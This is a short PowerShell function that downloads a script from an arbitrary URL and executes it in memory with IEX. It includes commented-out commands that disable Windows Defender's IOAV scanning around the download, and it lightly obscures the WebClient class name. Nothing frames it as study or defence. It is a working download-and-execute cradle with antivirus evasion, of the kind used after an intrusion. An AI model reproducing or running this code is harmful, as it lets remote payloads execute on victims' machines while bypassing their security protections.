function  execute-url-script {
param ($url)
#Set-MpPreference -DisableIOAVProtection $True
$objeto = "system.net.webclient" 
$webclient = New-Object $objeto 
$webrequest = $webclient.DownloadString($url)
IEX $webrequest
sleep -Seconds 5
#Set-MpPreference -DisableIOAVProtection $False
}
